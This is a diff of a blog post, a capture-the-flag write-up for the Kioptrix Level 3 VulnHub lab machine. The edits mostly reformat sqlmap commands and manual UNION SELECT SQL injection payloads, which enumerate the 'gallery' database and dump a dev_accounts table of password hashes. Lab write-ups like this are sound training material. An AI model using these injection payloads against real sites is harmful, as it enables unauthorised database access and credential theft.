@@ -1,10 +1,12 @@
 ---
-layout: post
+layout: posts
 title:  "Kioptrix Level 3 Writeup"
 date:   2019-04-14 21:28:02 +0530
 author: Kyle Simmons
 categories: [vulnhub, vulnerable-machine]
 ---
+Kioptrix level 3 vulnerable machine from vulnhub.
+
 Kioptrix level 3 vulnhub link below: <br>
 [Kioptrix Level 3 download page]
 <br><br>
@@ -100,7 +102,7 @@ available databases [3]:<br>
 Three databases were revealed above. The gallery database could be the contents of
 the images and users of the gallery. The database <font color="red">gallery</font> can searched next.
 <br><br>
-<font color="red">sqlmap -u http://192.168.0.71/gallery/gallery.php\?id\=">http://192.168.0.71/gallery/gallery.php\?id\= -D gallery --'tables'</font>
+`sqlmap -u http://192.168.0.71/gallery/gallery.php\?id\=">http://192.168.0.71/gallery/gallery.php\?id\= -D gallery --'tables'`
 
 {% highlight shell_session %}
 Database: gallery
@@ -118,7 +120,7 @@ Database: gallery
 <br>
 A table of <font color="red">dev_accounts</font> is worth investigating, this could contain <font color="red">dev</font> accounts.. duh.
 <br><br>
-<font color="red">sqlmap -u http://192.168.0.71/gallery/gallery.php\?id\=http://192.168.0.71/gallery/gallery.php\?id\= -D gallery -T dev_accounts --dump</font>
+`sqlmap -u http://192.168.0.71/gallery/gallery.php\?id\=http://192.168.0.71/gallery/gallery.php\?id\= -D gallery -T dev_accounts --dump`
 
 {% highlight shell_session %}
 Database: gallery
@@ -138,16 +140,16 @@ crackable with sqlmap.
 <h3>1.2.4 HTTP - SQLI (without sqlmap)</h3>
 
 Checking for the amount of columns by using <font color="red">ORDER BY</font>.<br>
-<font color="red">id=2 union select 1,2,3,4,5,6</font>
+`id=2 union select 1,2,3,4,5,6`
 <br><br>
 Finding the database and tables using <font color="red">UNION SELECT</font>. This results in the database <font color="red">gallery</font> being shown. <br>
-<font color="red">id=2 UNION SELECT 1, table_schema, table_name,4,5,6 FROM information_schema.tables--</font>
+`id=2 UNION SELECT 1, table_schema, table_name,4,5,6 FROM information_schema.tables--`
 <br><br>
 Searching inside the database gallery:<br>
-<font color="red">id=1 UNION SELECT 1, table_name,3,4,5,6 FROM information_schema.tables WHERE table_schema = 'gallery'#</font>
+`id=1 UNION SELECT 1, table_name,3,4,5,6 FROM information_schema.tables WHERE table_schema = 'gallery'#`
 <br><br>
 The gallery table shows the dev_accouns table. The dev_accounts can then be searched for the columns.<br>
-<font color="red">id=1 UNION SELECT 1, column_name,3,4,5,6 FROM information_schema.columns WHERE table_name = 'dev_accounts'#</font>
+`id=1 UNION SELECT 1, column_name,3,4,5,6 FROM information_schema.columns WHERE table_name = 'dev_accounts'#`
 <br><br>
 The columns reveal the 2 user accounts and there corresponding hashes. The hashes can then be cracked with
 john the ripper.
